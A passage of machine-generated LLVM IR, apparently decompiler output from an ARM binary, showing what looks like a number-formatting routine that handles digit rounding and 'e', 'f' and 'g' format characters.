  br label %dec_label_pc_1377c

dec_label_pc_1377c:                               ; preds = %dec_label_pc_13814.dec_label_pc_1377c_crit_edge, %bb208
  %v2_13784 = phi i32 [ ptrtoint (i32* @global_var_1a9d8.590 to i32), %bb208 ], [ %v2_13784.pre, %dec_label_pc_13814.dec_label_pc_1377c_crit_edge ]
  %v0_13780 = phi i32 [ 9, %bb208 ], [ %v0_13814, %dec_label_pc_13814.dec_label_pc_1377c_crit_edge ]
  %v2_137c4 = phi i32 [ 8, %bb208 ], [ %stack_var_-192.3, %dec_label_pc_13814.dec_label_pc_1377c_crit_edge ]
  store i32 %v0_13758, i32* %r2.global-to-local, align 4
  %v1_13780 = add i32 %v0_13780, -1
  store i32 %v1_13780, i32* %sl.global-to-local, align 4
  store i32 %v2_13784, i32* @lr, align 4
  %v3_13788 = mul i32 %v1_13780, 8
  store i32 %v3_13788, i32* %r3.global-to-local, align 4
  store i1 %v2_1378c, i1* %cpsr_z.global-to-local, align 1
  %v0_13790 = load i32, i32* @r5, align 4
  store i32 %v0_13790, i32* %r0.global-to-local, align 4
  %v0_13794 = load i32, i32* @r6, align 4
  store i32 %v0_13794, i32* %r1.global-to-local, align 4
  %v2_13798 = add i32 %v3_13788, %v2_13784
  store i32 %v2_13798, i32* %ip.global-to-local, align 4
  %v1_137d4 = inttoptr i32 %v2_13798 to i32*
  %v2_137d4 = load i32, i32* %v1_137d4, align 4
  store i32 %v2_137d4, i32* %r2.global-to-local, align 4
  %v3_137d4 = add i32 %v2_13798, 4
  %v4_137d4 = inttoptr i32 %v3_137d4 to i32*
  %v5_137d4 = load i32, i32* %v4_137d4, align 4
  store i32 %v5_137d4, i32* %r3.global-to-local, align 4
  br i1 %v2_1378c, label %dec_label_pc_137d4, label %dec_label_pc_137a0

dec_label_pc_137a0:                               ; preds = %dec_label_pc_1377c
  %v4_137a4 = sext i32 %v0_13790 to i64
  %v5_137a4 = call i32 @function_17ee0(i64 %v4_137a4, i32 %v0_13794, i32 %v2_137d4, i32 %v5_137d4)
  store i32 %v5_137a4, i32* @r0, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  store i32 %v5_137a4, i32* %r7.global-to-local, align 4
  store i32 %v0_13794, i32* %r8.global-to-local, align 4
  %v1_137b8 = call i32 @function_1845c(i32 %v5_137a4)
  store i32 %v1_137b8, i32* %r0.global-to-local, align 4
  %v2_137bc = icmp eq i32 %v1_137b8, 0
  store i1 %v2_137bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_137bc, label %dec_label_pc_13814, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_137a0
  %v1_137c4 = load i32, i32* @r4, align 4
  %v3_137c4 = sub i32 %v2_137c4, %v1_137c4
  store i32 %v3_137c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1380c

dec_label_pc_137d4:                               ; preds = %dec_label_pc_1377c
  store i32 %v0_13790, i32* %r0.global-to-local, align 4
  store i32 %v0_13794, i32* %r1.global-to-local, align 4
  %v4_137e0 = call i32 @function_18170(i32 %v0_13790, i32 %v0_13794, i32 %v2_137d4, i32 %v5_137d4)
  store i32 %v4_137e0, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 1100470148, i32* @r3, align 4
  store i32 %v4_137e0, i32* %r7.global-to-local, align 4
  store i32 %v0_13794, i32* %r8.global-to-local, align 4
  %v4_137f4 = call i32 @function_1848c(i32 %v4_137e0, i32 %v0_13794, i32 0, i32 1100470148)
  store i32 %v4_137f4, i32* %r0.global-to-local, align 4
  %v2_137f8 = icmp eq i32 %v4_137f4, 0
  store i1 %v2_137f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_137f8, label %dec_label_pc_13814, label %dec_label_pc_13800

dec_label_pc_13800:                               ; preds = %dec_label_pc_137d4
  %v1_13804 = load i32, i32* @r4, align 4
  %v2_13804 = add i32 %v1_13804, %v2_137c4
  store i32 %v2_13804, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1380c

dec_label_pc_1380c:                               ; preds = %.thread10, %dec_label_pc_13800
  %stack_var_-192.2 = phi i32 [ %v2_13804, %dec_label_pc_13800 ], [ %v3_137c4, %.thread10 ]
  %v0_1380c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1380c, i32* @r5, align 4
  %v0_13810 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_13810, i32* @r6, align 4
  br label %dec_label_pc_13814

dec_label_pc_13814:                               ; preds = %dec_label_pc_137a0, %dec_label_pc_137d4, %dec_label_pc_1380c
  %stack_var_-192.3 = phi i32 [ %v2_137c4, %dec_label_pc_137d4 ], [ %stack_var_-192.2, %dec_label_pc_1380c ], [ %v2_137c4, %dec_label_pc_137a0 ]
  %v0_13814 = load i32, i32* %sl.global-to-local, align 4
  %v2_13814 = icmp eq i32 %v0_13814, 0
  store i1 %v2_13814, i1* %cpsr_z.global-to-local, align 1
  %v0_13818 = load i32, i32* @r4, align 4
  %v3_13818 = sdiv i32 %v0_13818, 2
  store i32 %v3_13818, i32* @r4, align 4
  br i1 %v2_13814, label %dec_label_pc_13820, label %dec_label_pc_13814.dec_label_pc_1377c_crit_edge

dec_label_pc_13814.dec_label_pc_1377c_crit_edge:  ; preds = %dec_label_pc_13814
  %v2_13784.pre = load i32, i32* %stack_var_-208, align 4
  br label %dec_label_pc_1377c

dec_label_pc_13820:                               ; preds = %dec_label_pc_13814
  %v0_13820 = load i32, i32* @r5, align 4
  store i32 %v0_13820, i32* @r0, align 4
  %v0_13824 = load i32, i32* @r6, align 4
  store i32 %v0_13824, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  store i32 1104006501, i32* @r3, align 4
  %v4_13830 = call i32 @function_1848c(i32 %v0_13820, i32 %v0_13824, i32 0, i32 1104006501)
  store i32 %v4_13830, i32* %r0.global-to-local, align 4
  %v2_13834 = icmp eq i32 %v4_13830, 0
  store i1 %v2_13834, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13834, label %dec_label_pc_13864, label %dec_label_pc_1383c

dec_label_pc_1383c:                               ; preds = %dec_label_pc_13820
  %v0_1383c = load i32, i32* @r5, align 4
  store i32 %v0_1383c, i32* %r0.global-to-local, align 4
  %v0_13840 = load i32, i32* @r6, align 4
  store i32 %v0_13840, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1076101120, i32* %r3.global-to-local, align 4
  %v4_1384c = call i32 @function_18170(i32 %v0_1383c, i32 %v0_13840, i32 0, i32 1076101120)
  store i32 %v4_1384c, i32* %r0.global-to-local, align 4
  store i32 %v4_1384c, i32* @r5, align 4
  store i32 %v0_13840, i32* @r6, align 4
  %v1_1385c = add i32 %stack_var_-192.3, 1
  store i32 %v1_1385c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13864

dec_label_pc_13864:                               ; preds = %dec_label_pc_1383c, %bb204, %dec_label_pc_13820, %dec_label_pc_13684
  %stack_var_-192.4 = phi i32 [ %stack_var_-192.3, %dec_label_pc_13820 ], [ -1, %dec_label_pc_13684 ], [ -1, %bb204 ], [ %v1_1385c, %dec_label_pc_1383c ]
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_13868 = ptrtoint i32* %stack_var_-81 to i32
  store i32 %v2_13868, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1386c

dec_label_pc_1386c:                               ; preds = %dec_label_pc_138e4, %dec_label_pc_13864
  %v0_1386c = load i32, i32* @r6, align 4
  store i32 %v0_1386c, i32* %r1.global-to-local, align 4
  %v0_13870 = load i32, i32* @r5, align 4
  store i32 %v0_13870, i32* %r0.global-to-local, align 4
  %v2_13874 = call i32 @function_184bc(i32 %v0_13870, i32 %v0_1386c)
  store i32 %v2_13874, i32* @r0, align 4
  store i32 %v2_13874, i32* %r8.global-to-local, align 4
  %v0_1387c = call i32 @function_17de0()
  store i32 %v0_1387c, i32* %r2.global-to-local, align 4
  store i32 %v0_1386c, i32* %r3.global-to-local, align 4
  %v0_13888 = load i32, i32* @r5, align 4
  store i32 %v0_13888, i32* @r0, align 4
  %v0_1388c = load i32, i32* @r6, align 4
  store i32 %v0_1388c, i32* %r1.global-to-local, align 4
  %v4_13890 = call i32 @function_17acc(i32 %v0_13888, i32 %v0_1388c, i32 %v0_1387c, i32 %v0_1386c)
  store i32 %v4_13890, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1104006501, i32* %r3.global-to-local, align 4
  %v4_1389c = sext i32 %v4_13890 to i64
  %v5_1389c = call i32 @function_17ee0(i64 %v4_1389c, i32 %v0_1388c, i32 0, i32 1104006501)
  store i32 %v5_1389c, i32* %r0.global-to-local, align 4
  %v0_138a0 = load i32, i32* %sl.global-to-local, align 4
  %v1_138a0 = add i32 %v0_138a0, 9
  store i32 %v1_138a0, i32* %sl.global-to-local, align 4
  store i32 %v5_1389c, i32* @r5, align 4
  store i32 %v0_1388c, i32* @r6, align 4
  store i32 0, i32* @r7, align 4
  %v0_138b0.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_138b0

dec_label_pc_138b0:                               ; preds = %dec_label_pc_138b0, %dec_label_pc_1386c
  %v0_138b0 = phi i32 [ %v0_138d4, %dec_label_pc_138b0 ], [ %v0_138b0.pre, %dec_label_pc_1386c ]
  store i32 %v0_138b0, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_138b8 = call i32 @function_ca5c(i32 %v0_138b0, i32 10)
  %v0_138bc = load i32, i32* @r7, align 4
  %v1_138bc = add i32 %v0_138bc, 1
  store i32 %v1_138bc, i32* @r7, align 4
  store i32 58, i32* %r2.global-to-local, align 4
  %v1_138c4 = load i32, i32* %sl.global-to-local, align 4
  %v2_138c4 = sub i32 %v1_138c4, %v1_138bc
  store i32 %v2_138c4, i32* @r3, align 4
  %v0_138c8 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_138c8, i32* @r0, align 4
  store i32 10, i32* @r1, align 4
  %v3_138d0 = inttoptr i32 %v2_138c4 to i8*
  store i8 58, i8* %v3_138d0, align 1
  %v0_138d4 = call i32 @function_c960()
  store i32 %v0_138d4, i32* %r0.global-to-local, align 4
  %v0_138d8 = load i32, i32* @r7, align 4
  %v7_138d8 = icmp eq i32 %v0_138d8, 8
  store i1 %v7_138d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_138d4, i32* %r8.global-to-local, align 4
  %v7_138e0 = icmp slt i32 %v0_138d8, 9
  br i1 %v7_138e0, label %dec_label_pc_138b0, label %dec_label_pc_138e4

dec_label_pc_138e4:                               ; preds = %dec_label_pc_138b0
  %v0_138e4 = load i32, i32* @r4, align 4
  %v1_138e4 = add i32 %v0_138e4, 1
  store i32 %v1_138e4, i32* %r4.global-to-local, align 4
  %v7_138e8 = icmp eq i32 %v0_138e4, 0
  store i1 %v7_138e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_138e8, label %dec_label_pc_1386c, label %dec_label_pc_138f0

dec_label_pc_138f0:                               ; preds = %dec_label_pc_138e4
  %v0_138f0 = load i32, i32* %sb.global-to-local, align 4
  %v7_138f0 = icmp eq i32 %v0_138f0, 96
  store i1 %v7_138f0, i1* %cpsr_z.global-to-local, align 1
  %tmp270 = icmp ult i32 %v0_138f0, 97
  br i1 %tmp270, label %bb209, label %thread-pre-split

bb209:                                            ; preds = %dec_label_pc_138f0
  %v5_13900 = add i32 %v0_138f0, 32
  store i32 %v5_13900, i32* %r3.global-to-local, align 4
  %v5_13904 = urem i32 %v5_13900, 256
  store i32 %v5_13904, i32* %sb.global-to-local, align 4
  br label %bb210

thread-pre-split:                                 ; preds = %dec_label_pc_138f0
  %v4_138fc.pre126131 = load i32, i32* @r3, align 4
  %phitmp = urem i32 %v4_138fc.pre126131, 256
  br label %bb210

bb210:                                            ; preds = %thread-pre-split, %bb209
  %v4_138fc123127 = phi i32 [ %phitmp, %thread-pre-split ], [ 69, %bb209 ]
  %v0_13924 = phi i32 [ %v0_138f0, %thread-pre-split ], [ %v5_13904, %bb209 ]
  %v7_13908 = icmp eq i32 %v0_13924, 103
  %. = zext i1 %v7_13908 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_13914 = load i32, i32* %fp.global-to-local, align 4
  %v2_13914 = icmp eq i32 %v0_13914, 0
  store i1 %v2_13914, i1* %cpsr_z.global-to-local, align 1
  %tmp213 = icmp slt i32 %v0_13914, 1
  br i1 %tmp213, label %.thread16, label %bb214

.thread16:                                        ; preds = %bb210
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %bb216

bb214:                                            ; preds = %bb210
  %v2_1391c = icmp eq i1 %v7_13908, false
  store i1 %v2_1391c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1391c, label %bb216, label %bb215

bb215:                                            ; preds = %bb214
  %v2_13920 = add i32 %v0_13914, -1
  store i32 %v2_13920, i32* %fp.global-to-local, align 4
  br label %bb216

bb216:                                            ; preds = %.thread16, %bb214, %bb215
  %v0_13934 = phi i32 [ %v0_13914, %.thread16 ], [ %v0_13914, %bb214 ], [ %v2_13920, %bb215 ]
  %v7_13924 = icmp eq i32 %v0_13924, 102
  store i1 %v7_13924, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13924, label %dec_label_pc_13930, label %bb217

bb217:                                            ; preds = %bb216
  store i32 %v0_13934, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13958

dec_label_pc_13930:                               ; preds = %bb216
  store i32 %stack_var_-192.4, i32* %r3.global-to-local, align 4
  %v2_13934 = add i32 %v0_13934, %stack_var_-192.4
  store i32 %v2_13934, i32* %ip.global-to-local, align 4
  %v8_13938 = icmp eq i32 %v2_13934, -1
  store i1 %v8_13938, i1* %cpsr_z.global-to-local, align 1
  %v6_1393c = icmp slt i32 %v2_13934, -1
  br i1 %v6_1393c, label %dec_label_pc_13940, label %dec_label_pc_13958

dec_label_pc_13940:                               ; preds = %dec_label_pc_13930
  %v2_13940 = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_13940, i32* %r0.global-to-local, align 4
  store i32 48, i32* %r1.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v2_1394c = bitcast i32* %stack_var_-83 to i8*
  %v3_1394c = call i32 @function_f240(i8* %v2_1394c, i32 48)
  store i32 %v3_1394c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13958

dec_label_pc_13958:                               ; preds = %bb217, %dec_label_pc_13930, %dec_label_pc_13940
  %v1_1399c90 = phi i32 [ %v3_1394c, %dec_label_pc_13940 ], [ %v0_138d4, %dec_label_pc_13930 ], [ %v0_138d4, %bb217 ]
  %v1_13980 = phi i32 [ -1, %dec_label_pc_13940 ], [ %v2_13934, %dec_label_pc_13930 ], [ %v0_13934, %bb217 ]
  %stack_var_-192.5 = phi i32 [ -1, %dec_label_pc_13940 ], [ %stack_var_-192.4, %dec_label_pc_13930 ], [ %stack_var_-192.4, %bb217 ]
  %v1_1395c = add i32 %v1_13980, -16
  %v3_1395c = sub i32 15, %v1_13980
  %v4_1395c = and i32 %v3_1395c, %v1_13980
  %v5_1395c = icmp slt i32 %v4_1395c, 0
  %v6_1395c = icmp slt i32 %v1_1395c, 0
  %v7_1395c = icmp eq i32 %v1_13980, 16
  store i1 %v7_1395c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 48, i32* %stack_var_-82, align 4
  %v2_13968 = ptrtoint i32* %stack_var_-83 to i32
  store i32 %v2_13968, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-83, align 4
  %v3_13970 = xor i1 %v6_1395c, %v5_1395c
  %v4_13970 = or i1 %v7_1395c, %v3_13970
  br i1 %v4_13970, label %dec_label_pc_1397c, label %.thread137

.thread137:                                       ; preds = %dec_label_pc_13958
  %v7_13970134138 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v7_13970134138, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.preheader

dec_label_pc_1397c:                               ; preds = %dec_label_pc_13958
  %v2_1397c = ptrtoint i32* %stack_var_-82 to i32
  %v2_13980 = add i32 %v1_13980, %v2_1397c
  store i32 %v2_13980, i32* %r3.global-to-local, align 4
  %v1_13984 = add i32 %v2_13980, 2
  %v2_13984 = inttoptr i32 %v1_13984 to i8*
  %v3_13984 = load i8, i8* %v2_13984, align 1
  %v4_13984 = zext i8 %v3_13984 to i32
  store i32 %v4_13984, i32* %r2.global-to-local, align 4
  store i32 %v1_13984, i32* %r1.global-to-local, align 4
  %v2_1398c = icmp ugt i8 %v3_13984, 51
  %v7_1398c = icmp eq i8 %v3_13984, 52
  store i1 %v7_1398c, i1* %cpsr_z.global-to-local, align 1
  %v2_13990 = xor i1 %v2_1398c, true
  %v3_13990 = or i1 %v7_1398c, %v2_13990
  br i1 %v3_13990, label %bb218, label %bb219

bb218:                                            ; preds = %dec_label_pc_1397c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb219

bb219:                                            ; preds = %dec_label_pc_1397c, %bb218
  %v1_1399c88 = phi i32 [ %v1_1399c90, %dec_label_pc_1397c ], [ 0, %bb218 ]
  %v2_13994 = xor i1 %v7_1398c, true
  %v3_13994 = and i1 %v2_1398c, %v2_13994
  br i1 %v3_13994, label %bb220, label %.preheader

bb220:                                            ; preds = %bb219
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %bb219, %bb220, %.thread137, %._crit_edge85
  %v0_13998 = phi i32 [ %v0_13998.pre, %._crit_edge85 ], [ %v7_13970134138, %.thread137 ], [ %v1_13984, %bb219 ], [ %v1_13984, %bb220 ]
  %v1_1399c = phi i32 [ %v1_1399c.pre, %._crit_edge85 ], [ 0, %.thread137 ], [ %v1_1399c88, %bb219 ], [ 1, %bb220 ]
  %v1_13998 = add i32 %v0_13998, -1
  %v2_13998 = inttoptr i32 %v1_13998 to i8*
  %v3_13998 = load i8, i8* %v2_13998, align 1
  %v4_13998 = zext i8 %v3_13998 to i32
  store i32 %v1_13998, i32* %r1.global-to-local, align 4
  %v2_1399c = add i32 %v4_13998, %v1_1399c
  %v1_139a0 = urem i32 %v2_1399c, 256
  store i32 %v1_139a0, i32* %r3.global-to-local, align 4
  %v2_139a4 = icmp ugt i32 %v1_139a0, 56
  %v7_139a4 = icmp eq i32 %v1_139a0, 57
  store i1 %v7_139a4, i1* %cpsr_z.global-to-local, align 1
  %v2_139a8 = xor i1 %v2_139a4, true
  %v3_139a8 = or i1 %v7_139a4, %v2_139a8
  br i1 %v3_139a8, label %bb221, label %bb222

bb221:                                            ; preds = %.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  br label %bb222

bb222:                                            ; preds = %.preheader, %bb221
  %v2_139ac = xor i1 %v7_139a4, true
  %v3_139ac = and i1 %v2_139a4, %v2_139ac
  br i1 %v3_139ac, label %bb223, label %bb222.bb224_crit_edge

bb222.bb224_crit_edge:                            ; preds = %bb222
  %v1_139b4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb224

bb223:                                            ; preds = %bb222
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb224

bb224:                                            ; preds = %bb222.bb224_crit_edge, %bb223
  %v1_139b4 = phi i32 [ %v1_139b4.pre, %bb222.bb224_crit_edge ], [ 1, %bb223 ]
  %v7_139b0 = icmp eq i32 %v1_139a0, 48
  store i1 %v7_139b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_139b0, label %bb225, label %._crit_edge91

bb225:                                            ; preds = %bb224
  %v2_139b4 = or i32 %v1_139b4, 1
  store i32 %v2_139b4, i32* %r2.global-to-local, align 4
  br label %._crit_edge91

._crit_edge91:                                    ; preds = %bb224, %bb225
  %v0_139b8 = phi i32 [ 1, %bb225 ], [ %v1_139b4, %bb224 ]
  %v2_139b8 = icmp eq i32 %v0_139b8, 0
  store i1 %v2_139b8, i1* %cpsr_z.global-to-local, align 1
  %v1_139bc = trunc i32 %v2_1399c to i8
  store i8 %v1_139bc, i8* %v2_13998, align 1
  %v0_139c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_139c0, label %dec_label_pc_139c4, label %._crit_edge85

._crit_edge85:                                    ; preds = %._crit_edge91
  %v1_1399c.pre = load i32, i32* %r0.global-to-local, align 4
  %v0_13998.pre = load i32, i32* %r1.global-to-local, align 4
  br label %.preheader

dec_label_pc_139c4:                               ; preds = %._crit_edge91
  store i32 %v2_13968, i32* %r2.global-to-local, align 4
  %v2_139c8 = ptrtoint i32* %stack_var_-82 to i32
  store i32 %v2_139c8, i32* %r3.global-to-local, align 4
  %v0_139cc = load i32, i32* %r1.global-to-local, align 4
  %v3_139cc = icmp uge i32 %v0_139cc, %v2_139c8
  %v9_139cc = icmp eq i32 %v0_139cc, %v2_139c8
  store i1 %v9_139cc, i1* %cpsr_z.global-to-local, align 1
  %v2_139d0 = xor i1 %v3_139cc, true
  %v3_139d0 = or i1 %v9_139cc, %v2_139d0
  br i1 %v3_139d0, label %bb226, label %.thread142

bb226:                                            ; preds = %dec_label_pc_139c4
  store i32 %stack_var_-192.5, i32* @lr, align 4
  store i32 %v2_139c8, i32* %r2.global-to-local, align 4
  store i32 %v2_139c8, i32* %r1.global-to-local, align 4
  br label %.thread142

.thread142:                                       ; preds = %dec_label_pc_139c4, %bb226
  %v2_139f0 = phi i32 [ %v2_139c8, %bb226 ], [ %v0_139cc, %dec_label_pc_139c4 ]
  %v4_139e4141 = phi i32 [ %v2_139c8, %bb226 ], [ %v2_13968, %dec_label_pc_139c4 ]
  %v2_139dc = xor i1 %v9_139cc, true
  %v3_139dc = and i1 %v3_139cc, %v2_139dc
  br i1 %v3_139dc, label %bb227, label %bb228

bb227:                                            ; preds = %.thread142
  store i32 %stack_var_-192.5, i32* %r0.global-to-local, align 4
  br label %bb228

bb228:                                            ; preds = %.thread142, %bb227
  br i1 %v3_139d0, label %bb229, label %bb230

bb229:                                            ; preds = %bb228
  %v4_139e0 = load i32, i32* @lr, align 4
  %v5_139e0 = add i32 %v4_139e0, 1
  store i32 %v5_139e0, i32* %r0.global-to-local, align 4
  br label %bb230

bb230:                                            ; preds = %bb228, %bb229
  br i1 %v3_139dc, label %bb231, label %bb232

bb231:                                            ; preds = %bb230
  %v5_139e4 = add i32 %v4_139e4141, 2
  store i32 %v5_139e4, i32* %r2.global-to-local, align 4
  br label %bb232

bb232:                                            ; preds = %bb230, %bb231
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_139ec = load i32, i32* %sb.global-to-local, align 4
  %v7_139ec = icmp eq i32 %v0_139ec, 103
  store i1 %v7_139ec, i1* %cpsr_z.global-to-local, align 1
  %v3_139f0 = add i32 %v2_139f0, 1
  %v4_139f0 = inttoptr i32 %v3_139f0 to i8*
  store i8 0, i8* %v4_139f0, align 1
  %v0_139f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_139f4 = add i32 %v0_139f4, 1
  store i32 %v1_139f4, i32* %lr.global-to-local, align 4
  %v0_139f8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_139f8, label %dec_label_pc_139fc, label %dec_label_pc_13a24

dec_label_pc_139fc:                               ; preds = %bb232
  %v0_139fc = load i32, i32* %r0.global-to-local, align 4
  %v1_139fc = load i32, i32* %ip.global-to-local, align 4
  %v2_139fc = sub i32 %v0_139fc, %v1_139fc
  %v4_139fc = xor i32 %v1_139fc, %v0_139fc
  %v5_139fc = xor i32 %v2_139fc, %v0_139fc
  %v6_139fc = and i32 %v5_139fc, %v4_139fc
  %v7_139fc = icmp slt i32 %v6_139fc, 0
  %v8_139fc = icmp slt i32 %v2_139fc, 0
  %v9_139fc = icmp eq i32 %v0_139fc, %v1_139fc
  %v3_13a00 = xor i1 %v8_139fc, %v7_139fc
  %v4_13a00 = or i1 %v9_139fc, %v3_13a00
  %.254 = zext i1 %v4_13a00 to i32
  store i32 %.254, i32* %r3.global-to-local, align 4
  %v1_13a08 = add i32 %v0_139fc, 4
  %v3_13a08 = sub i32 0, %v0_139fc
  %v4_13a08 = and i32 %v1_13a08, %v3_13a08
  %v5_13a08 = icmp slt i32 %v4_13a08, 0
  %v6_13a08 = icmp slt i32 %v1_13a08, 0
  %v7_13a08 = icmp eq i32 %v1_13a08, 0
  store i1 %v7_13a08, i1* %cpsr_z.global-to-local, align 1
  %v2_13a0c = xor i1 %v6_13a08, %v5_13a08
  br i1 %v2_13a0c, label %.thread21, label %bb235

.thread21:                                        ; preds = %dec_label_pc_139fc
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13d40

bb235:                                            ; preds = %dec_label_pc_139fc
  %v2_13a10 = icmp eq i1 %v4_13a00, false
  store i1 %v2_13a10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13a10, label %dec_label_pc_13d40, label %.thread24

.thread24:                                        ; preds = %bb235
  %v3_13a14 = sub i32 %v1_139fc, %v0_139fc
  store i32 %v3_13a14, i32* %fp.global-to-local, align 4
  store i32 102, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13a30

dec_label_pc_13a24:                               ; preds = %bb232
  %v0_13a24 = load i32, i32* %sb.global-to-local, align 4
  %v7_13a24 = icmp eq i32 %v0_13a24, 102
  store i1 %v7_13a24, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_13a24, i32* %r8.global-to-local, align 4
  br i1 %v7_13a24, label %dec_label_pc_13a24.dec_label_pc_13a30_crit_edge, label %dec_label_pc_13a40

dec_label_pc_13a24.dec_label_pc_13a30_crit_edge:  ; preds = %dec_label_pc_13a24
  %v0_13a30.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13a30

dec_label_pc_13a30:                               ; preds = %.thread24, %dec_label_pc_13a24.dec_label_pc_13a30_crit_edge
  %v0_13a30 = phi i32 [ %v0_13a30.pre, %dec_label_pc_13a24.dec_label_pc_13a30_crit_edge ], [ %v0_139fc, %.thread24 ]
  %v1_13a30 = icmp slt i32 %v0_13a30, 0
  %v2_13a30 = icmp eq i32 %v0_13a30, 0
  store i1 %v2_13a30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_13a30, label %bb236, label %dec_label_pc_13a40

bb236:                                            ; preds = %dec_label_pc_13a30
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_13a38 = load i32, i32* %r2.global-to-local, align 4
  %v6_13a38 = add i32 %v5_13a38, -1
  %v7_13a38 = inttoptr i32 %v6_13a38 to i8*
  store i8 48, i8* %v7_13a38, align 1
  %v8_13a38 = load i32, i32* %r2.global-to-local, align 4
  %v9_13a38 = add i32 %v8_13a38, -1
  store i32 %v9_13a38, i32* %r2.global-to-local, align 4
  %v0_13a3c.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_13a70.pre.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_13a40

dec_label_pc_13a40:                               ; preds = %bb236, %dec_label_pc_13a30, %dec_label_pc_13d40, %dec_label_pc_13a24
  %v1_13a70 = phi i32 [ %v1_139f4, %dec_label_pc_13a24 ], [ %v1_139f4, %dec_label_pc_13d40 ], [ %v1_13a70.pre.pre, %bb236 ], [ %v1_139f4, %dec_label_pc_13a30 ]
  %v1_13ae830 = phi i32 [ 0, %dec_label_pc_13a24 ], [ 0, %dec_label_pc_13d40 ], [ %v0_13a3c.pre, %bb236 ], [ %v0_13a30, %dec_label_pc_13a30 ]
  store i32 %v1_13ae830, i32* %r1.global-to-local, align 4
  store i32 1, i32* %stack_var_-164, align 4
  store i32 176, i32* %r4.global-to-local, align 4
  %v2_13a4c = ptrtoint i32* %stack_var_-42 to i32
  store i32 %v2_13a4c, i32* %r3.global-to-local, align 4
  %v0_13a58 = load i32, i32* %r2.global-to-local, align 4
  %v1_13a58 = inttoptr i32 %v0_13a58 to i8*
  %v2_13a58 = load i8, i8* %v1_13a58, align 1
  %v3_13a58 = zext i8 %v2_13a58 to i32
  store i32 %v3_13a58, i32* %r3.global-to-local, align 4
  %v5_13a58 = add i32 %v0_13a58, 1
  store i32 %v5_13a58, i32* %r2.global-to-local, align 4
  %v1_13a5c = icmp slt i32 %v1_13ae830, 0
  %v2_13a5c = icmp eq i32 %v1_13ae830, 0
  store i1 %v2_13a5c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 %v5_13a58, i32* %r6.global-to-local, align 4
  store i32 %v3_13a58, i32* %stack_var_-42, align 4
  %v2_13a70 = sub i32 %v1_13a70, %v5_13a58
  store i32 %v2_13a70, i32* %ip.global-to-local, align 4
  br i1 %v1_13a5c, label %.thread, label %dec_label_pc_13a7c

.thread:                                          ; preds = %dec_label_pc_13a40
  %v5_13a74 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v5_13a74, i32* @r7, align 4
  br label %dec_label_pc_13af8

dec_label_pc_13a7c:                               ; preds = %dec_label_pc_13a40
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_13a80 = sub i32 %v1_13ae830, %v2_13a70
  %v4_13a80 = xor i32 %v2_13a70, %v1_13ae830
  %v5_13a80 = xor i32 %v2_13a80, %v1_13ae830
  %v6_13a80 = and i32 %v5_13a80, %v4_13a80
  %v7_13a80 = icmp slt i32 %v6_13a80, 0
  %v8_13a80 = icmp slt i32 %v2_13a80, 0
  %v9_13a80 = icmp eq i32 %v1_13ae830, %v2_13a70
  store i1 %v9_13a80, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-156, align 4
